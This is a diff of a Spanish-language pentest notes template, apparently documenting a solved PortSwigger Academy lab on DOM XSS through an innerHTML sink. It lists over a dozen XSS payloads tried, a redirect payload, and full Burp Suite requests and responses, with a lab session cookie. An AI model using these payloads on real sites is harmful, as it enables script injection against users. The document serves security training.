@@ -4,7 +4,7 @@
 
 <details>
 
-<summary>👁️ RECONOCIMIENTO PASIVO</summary>
+<summary>👁️ RECONOCIMIENTO PASIVO ✔️</summary>
 
 ## AUDITORIA DE: ((RELEVANT))
 
@@ -14,13 +14,85 @@
 
 ### RECONOCIMIENTO PASIVO
 
-*   [ ] BROWSER👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)
+*   [x] BROWSER👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)
 
     ```python
-    # Espacio para fragmento de código Python -->
+    SCRIPT inertHTML en el sitio WEB:
+
+
+    function doSearchQuery(query) {
+    document.getElementById('searchMessage').innerHTML = query;
+    }
+    var query = (new URLSearchParams(window.location.search)).get('search');
+    if(query) {
+    doSearchQuery(query);
+    }
+                            
+
+
+
+
+
+    PROBANDO PAYLOADS:
+
+
+    </span><script>alert('P4IM0N');</script><!--
+
+
+    </sp</span>an><script>alert('P4IM0N');</script><!--
+
+
+    <span></span><script>alert('P4IM0N');</script><!--
+
+
+    <span></span><script>alert('P4IM0N');</script>
+
+
+    </span><script>alert('P4IM0N');</script>
+
+
+    "";<script>alert('P4IM0N');</script>
+
+
+    'HACE CLICK ACA MANITO<span onclick="alert(\'P4IM0N\')">Haz clic aquí</span>
+
+
+    'HACE CLICK ACA MANITO<a onclick="alert(\'P4IM0N\')">Haz clic aquí</a>
+
+
+    <a onmouseover="alert('P4IM0N')">Haz clic aquí</a>  SI
+
+
+    </span><a onmouseover="alert('P4IM0N')">PASA EL MOUSE AQUI MANITO aquí</a>
+
+    <script>var message = "<a onmouseover="alert('P4IM0N')">PASA EL MOUSE AQUI MANITO aquí</a>;";     document.currentScript.innerHTML = message;</script>
+
+
+    <img onmouseover="alert('P4IM0N')">
+
+
+
+
+
+    PAYLOAD FUNCIONANDO:
+
+    <a onmouseover="alert('P4IM0N')">PASA EL MOUSE AQUI MANITO aquí</a>
+
+
+    <a onmouseover="window.location.href = 'https://www.google.com'">PASA EL MOUSE QUI MANITO</a>
+
+    <a onmouseover="alert('P4IM0N')">PASA EL MOUSE AQUI MANITO aquí</a>
+
+
+    <img src="#" onerror="alert('P4IM0N')">
     ```
 
-    * CONCLUSION:
+    * CONCLUSION: CARGAMOS ESTE PAYLOAD EN SEARCH Y FUNCIONO PERO SE EJEJCUTA LUEGO DE ACARGAR EL DOM, AL PASAR EL MOUSE POR ENCIMA, POR ENDE NO M DIO EL APROVADO. TAMBIEN CARGAMOS ESTE PAYLOAD EN SEARCH Y FUNCIONO PERO SE EJEJCUTA LUEGO DE ACARGAR EL DOM, AL PASAR EL MOUSE POR ENCIMA NOS DIRIGUE A LA PAGINA DE GOOGLE ASI COMO PODRIA SER EXPLOTANDOLO QUE DIORIJA A UN SITIO LMALISISO, POR ENDE NO M DIO EL APROVADO. PERO LA REQUEST QUE FUNCIONO SEGUN LO SOLICIATDO POR EL LABORATORIO, ESTE FUNCIONO POR QUE SE EJECUTA AUTOMATICAMENTE AL TENER UN ERROR EN LA CARGA DE LA IMG IMAGEN, Y SE LOGRA EJECUTAR EL ALERT ANTES DE QUE SE CARGU EL DOM DE EL SITIO, Y CON ESTE LO CONSEGUIMOS APROBAR.
+    *
+
+        <figure><img src="../../../.gitbook/assets/DOM-XSSeninertHTMLscript.png" alt=""><figcaption></figcaption></figure>
+
+        <figure><img src="../../../.gitbook/assets/DOM-XSSeninnertHTMLexplotado.png" alt=""><figcaption></figcaption></figure>
 *   [ ] BROWSER👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)
 
     ```python
@@ -225,7 +297,7 @@
 
 <details>
 
-<summary>🔬 ANALISIS FORENSE</summary>
+<summary>🔬 ANALISIS FORENSE ❌</summary>
 
 ### ANALISIS FORENSE
 
@@ -424,7 +496,7 @@
 
 <details>
 
-<summary>👊 RECONOCIMIENTO ACTIVO</summary>
+<summary>👊 RECONOCIMIENTO ACTIVO ❌</summary>
 
 ### RECONOCIMIENTO ACTIVO
 
@@ -861,7 +933,7 @@
 
 <details>
 
-<summary>🕵️ INVESTIGACION OSINT</summary>
+<summary>🕵️ INVESTIGACION OSINT ❌ </summary>
 
 ### INVESTIGACION OSINT
 
@@ -1060,7 +1132,7 @@
 
 <details>
 
-<summary>⛓️ HASHES Y DESENCRIPTADOS</summary>
+<summary>⛓️ HASHES Y DESENCRIPTADOS ❌</summary>
 
 ### HASHES Y DESENCRIPTADOS
 
@@ -1287,7 +1359,7 @@
 
 <details>
 
-<summary>💪 FUERZA BRUTA A LOGINS</summary>
+<summary>💪 FUERZA BRUTA A LOGINS ❌</summary>
 
 ### FUERZA BRUTA A LOGINS
 
@@ -1451,7 +1523,7 @@
 
 <details>
 
-<summary>🛠️ SCRIPT DE EXPLOIT Y PAYLOADS</summary>
+<summary>🛠️ SCRIPT DE EXPLOIT Y PAYLOADS ❌</summary>
 
 ### SCRIPT DE EXPLOIT Y PAYLOADS
 
@@ -1573,7 +1645,7 @@
 
 <details>
 
-<summary>🤯 EXPLOTACION</summary>
+<summary>🤯 EXPLOTACION ✔️</summary>
 
 ### EXPLOTACION
 
@@ -1591,6 +1663,291 @@
     ```
 
     * CONCLUSION:
+
+<!---->
+
+*   [x] BURP SUITE👈 --------------------------------->[https://portswigger.net/web-security ](https://portswigger.net/web-security)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/burpsuite)
+
+    ```python
+    CARGAMOS ESTE PAYLOAD EN SEARCH Y FUNCIONO PERO SE EJEJCUTA LUEGO DE ACARGAR EL DOM, AL PASAR EL MOUSE POR ENCIMA, POR ENDE NO M DIO EL APROVADO.
+
+
+
+    REQUEST PASANDO EL PAYLOAD CON BURPSUITE:
+
+
+
+    GET /?search=<a onmouseover="alert('P4IM0N')">PASA EL MOUSE AQUI MANITO aquí</a> HTTP/1.1
+    Host: 0a8d009804e62f178419964e00710047.web-security-academy.net
+    Cookie: session=ZuQUQiWzDhLCBH94WqB9yfbsTcQC0zgp
+    Cache-Control: max-age=0
+    Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
+    Sec-Ch-Ua-Mobile: ?0
+    Sec-Ch-Ua-Platform: "Linux"
+    Upgrade-Insecure-Requests: 1
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    Sec-Fetch-Site: same-origin
+    Sec-Fetch-Mode: navigate
+    Sec-Fetch-User: ?1
+    Sec-Fetch-Dest: document
+    Referer: https://0a8d009804e62f178419964e00710047.web-security-academy.net/?search=%3Ca+onmouseover%3D%22alert%28%27P4IM0N%27%29%22%3EHaz+clic+aqu%C3%AD%3C%2Fa%3E
+    Accept-Encoding: gzip, deflate, br
+    Accept-Language: es-419,es;q=0.9,en;q=0.8
+    Connection: close
+
+
+
+
+
+    RESPONSE:
+
+
+
+
+    HTTP/2 200 OK
+    Content-Type: text/html; charset=utf-8
+    X-Frame-Options: SAMEORIGIN
+    Content-Length: 3708
+
+    <!DOCTYPE html>
+    <html>
+        <head>
+            <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
+            <link href=/resources/css/labsBlog.css rel=stylesheet>
+            <title>DOM XSS in innerHTML sink using source location.search</title>
+        </head>
+        <body>
+            <script src="/resources/labheader/js/labHeader.js"></script>
+            <div id="academyLabHeader">
+                <section class='academyLabBanner'>
+                    <div class=container>
+                        <div class=logo></div>
+                            <div class=title-container>
+                                <h2>DOM XSS in <code>innerHTML</code> sink using source <code>location.search</code></h2>
+                                <a class=link-back href='https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink'>
+                                    Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
+                                    <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
+                                        <g>
+                                            <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
+                                            <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
+                                        </g>
+                                    </svg>
+                                </a>
+                            </div>
+                            <div class='widgetcontainer-lab-status is-notsolved'>
+                                <span>LAB</span>
+                                <p>Not solved</p>
+                                <span class=lab-status-icon></span>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+            </div>
+            <div theme="blog">
+                <section class="maincontainer">
+                    <div class="container is-page">
+                        <header class="navigation-header">
+                            <section class="top-links">
+                                <a href=/>Home</a><p>|</p>
+                            </section>
+                        </header>
+                        <header class="notification-header">
+                        </header>
+                        <section class=blog-header>
+                            <h1><span>0 search results for '</span><span id="searchMessage"></span><span>'</span></h1>
+                            <script>
+                                function doSearchQuery(query) {
+                                    document.getElementById('searchMessage').innerHTML = query;
+                                }
+                                var query = (new URLSearchParams(window.location.search)).get('search');
+                                if(query) {
+                                    doSearchQuery(query);
+                                }
+                            </script>
+                            <hr>
+                        </section>
+                        <section class=search>
+                            <form action=/ method=GET>
+                                <input type=text placeholder='Search the blog...' name=search>
+                                <button type=submit class=button>Search</button>
+                            </form>
+                        </section>
+                        <section class="blog-list no-results">
+                            <div class=is-linkback>
+            <a href="/">Back to Blog</a>
+                            </div>
+                        </section>
+                    </div>
+                </section>
+                <div class="footer-wrapper">
+                </div>
+            </div>
+        </body>
+    </html>
+
+
+
+    -----------------
+
+
+    CARGAMOS ESTE PAYLOAD EN SEARCH Y FUNCIONO PERO SE EJEJCUTA LUEGO DE ACARGAR EL DOM, AL PASAR EL MOUSE POR ENCIMA NOS DIRIGUE A LA PAGINA DE GOOGLE ASI COMO PODRIA SER EXPLOTANDOLO QUE DIORIJA A UN SITIO LMALISISO, POR ENDE NO M DIO EL APROVADO.
+
+
+
+    REQUEST PASANDO EL PAYLOAD CON BURPSUITE:
+
+
+
+    GET /?search=<a onmouseover="window.location.href = 'https://www.google.com'">PASA EL MOUSE QUI MANITO</a> HTTP/1.1
+    Host: 0a8d009804e62f178419964e00710047.web-security-academy.net
+    Cookie: session=ZuQUQiWzDhLCBH94WqB9yfbsTcQC0zgp
+    Cache-Control: max-age=0
+    Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
+    Sec-Ch-Ua-Mobile: ?0
+    Sec-Ch-Ua-Platform: "Linux"
+    Upgrade-Insecure-Requests: 1
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    Sec-Fetch-Site: same-origin
+    Sec-Fetch-Mode: navigate
+    Sec-Fetch-User: ?1
+    Sec-Fetch-Dest: document
+    Referer: https://0a8d009804e62f178419964e00710047.web-security-academy.net/?search=%3Ca+onmouseover%3D%22alert%28%27P4IM0N%27%29%22%3EHaz+clic+aqu%C3%AD%3C%2Fa%3E
+    Accept-Encoding: gzip, deflate, br
+    Accept-Language: es-419,es;q=0.9,en;q=0.8
+    Connection: close
+
+
+
+
+
+    RESPONSE:
+
+
+
+
+    HTTP/2 200 OK
+    Content-Type: text/html; charset=utf-8
+    X-Frame-Options: SAMEORIGIN
+    Content-Length: 3708
+
+    <!DOCTYPE html>
+    <html>
+        <head>
+            <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
+            <link href=/resources/css/labsBlog.css rel=stylesheet>
+            <title>DOM XSS in innerHTML sink using source location.search</title>
+        </head>
+        <body>
+            <script src="/resources/labheader/js/labHeader.js"></script>
+            <div id="academyLabHeader">
+                <section class='academyLabBanner'>
+                    <div class=container>
+                        <div class=logo></div>
+                            <div class=title-container>
+                                <h2>DOM XSS in <code>innerHTML</code> sink using source <code>location.search</code></h2>
+                                <a class=link-back href='https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink'>
+                                    Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
+                                    <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
+                                        <g>
+                                            <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
+                                            <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
+                                        </g>
+                                    </svg>
+                                </a>
+                            </div>
+                            <div class='widgetcontainer-lab-status is-notsolved'>
+                                <span>LAB</span>
+                                <p>Not solved</p>
+                                <span class=lab-status-icon></span>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+            </div>
+            <div theme="blog">
+                <section class="maincontainer">
+                    <div class="container is-page">
+                        <header class="navigation-header">
+                            <section class="top-links">
+                                <a href=/>Home</a><p>|</p>
+                            </section>
+                        </header>
+                        <header class="notification-header">
+                        </header>
+                        <section class=blog-header>
+                            <h1><span>0 search results for '</span><span id="searchMessage"></span><span>'</span></h1>
+                            <script>
+                                function doSearchQuery(query) {
+                                    document.getElementById('searchMessage').innerHTML = query;
+                                }
+                                var query = (new URLSearchParams(window.location.search)).get('search');
+                                if(query) {
+                                    doSearchQuery(query);
+                                }
+                            </script>
+                            <hr>
+                        </section>
+                        <section class=search>
+                            <form action=/ method=GET>
+                                <input type=text placeholder='Search the blog...' name=search>
+                                <button type=submit class=button>Search</button>
+                            </form>
+                        </section>
+                        <section class="blog-list no-results">
+                            <div class=is-linkback>
+            <a href="/">Back to Blog</a>
+                            </div>
+                        </section>
+                    </div>
+                </section>
+                <div class="footer-wrapper">
+                </div>
+            </div>
+        </body>
+    </html>
+
+
+
+
+    --------------
+
+
+
+
+
+
+    REUQEST QUE FUNCIONO SEGUN LO SOLICIATDO POR EL LABORATORIO, ESTE FUNCIONO POR QUE SE EJECUTA AUTOMATICAMENTE AL TENER UN ERROR EN LA CARGA DE LA IMG IMAGEN, Y SE LOGRA EJECUTAR EL ALERT ANTES DE QUE SE CARGU EL DOM DE EL SITIO, Y CON ESTE LO CONSEGUIMOS APROBAR:
+
+
+
+
+
+    GET /?search=<img src="ruta_de_la_imagen" onerror="alert('P4IM0N')"> HTTP/2
+    Host: 0a8d009804e62f178419964e00710047.web-security-academy.net
+    Cookie: session=ZuQUQiWzDhLCBH94WqB9yfbsTcQC0zgp
+    Cache-Control: max-age=0
+    Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
+    Sec-Ch-Ua-Mobile: ?0
+    Sec-Ch-Ua-Platform: "Linux"
+    Upgrade-Insecure-Requests: 1
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    Sec-Fetch-Site: same-origin
+    Sec-Fetch-Mode: navigate
+    Sec-Fetch-User: ?1
+    Sec-Fetch-Dest: document
+    Referer: https://0a8d009804e62f178419964e00710047.web-security-academy.net/?search=%3Ca+onmouseover%3D%22alert%28%27P4IM0N%27%29%22%3EHaz+clic+aqu%C3%AD%3C%2Fa%3E
+    Accept-Encoding: gzip, deflate, br
+    Accept-Language: es-419,es;q=0.9,en;q=0.8
+
+
+
+    ///////////////////////////
+    ```
+
+    * CONCLUSION: CARGAMOS ESTE PAYLOAD EN SEARCH Y FUNCIONO PERO SE EJEJCUTA LUEGO DE ACARGAR EL DOM, AL PASAR EL MOUSE POR ENCIMA, POR ENDE NO M DIO EL APROVADO. TAMBIEN CARGAMOS ESTE PAYLOAD EN SEARCH Y FUNCIONO PERO SE EJEJCUTA LUEGO DE ACARGAR EL DOM, AL PASAR EL MOUSE POR ENCIMA NOS DIRIGUE A LA PAGINA DE GOOGLE ASI COMO PODRIA SER EXPLOTANDOLO QUE DIORIJA A UN SITIO LMALISISO, POR ENDE NO M DIO EL APROVADO. PERO LA REQUEST QUE FUNCIONO SEGUN LO SOLICIATDO POR EL LABORATORIO, ESTE FUNCIONO POR QUE SE EJECUTA AUTOMATICAMENTE AL TENER UN ERROR EN LA CARGA DE LA IMG IMAGEN, Y SE LOGRA EJECUTAR EL ALERT ANTES DE QUE SE CARGU EL DOM DE EL SITIO, Y CON ESTE LO CONSEGUIMOS APROBAR
 *   [ ] NETCAT👈 --------------------------------->[https://www.kali.org/tools/netcat/ ](https://www.kali.org/tools/netcat/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/57/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/netcat-conexiones)
 
     ```python
@@ -1758,7 +2115,7 @@
 
 <details>
 
-<summary>💠 ESCALADA DE PRIVILEGIOS WINDOWS</summary>
+<summary>💠 ESCALADA DE PRIVILEGIOS WINDOWS ❌</summary>
 
 ### ESCALADA DE PRIVILEGIOS WINDOWS
 
@@ -2020,7 +2377,7 @@
 
 <details>
 
-<summary>🐧 ESCALADA DE PRIVILEGIOS LINUX</summary>
+<summary>🐧 ESCALADA DE PRIVILEGIOS LINUX ❌</summary>
 
 ### ESCALADA DE PRIVILEGIOS LINUX
 
@@ -2247,7 +2604,7 @@
 
 <details>
 
-<summary>♻️ PIVOTING</summary>
+<summary>♻️ PIVOTING ❌</summary>
 
 ### PIVOTING
 
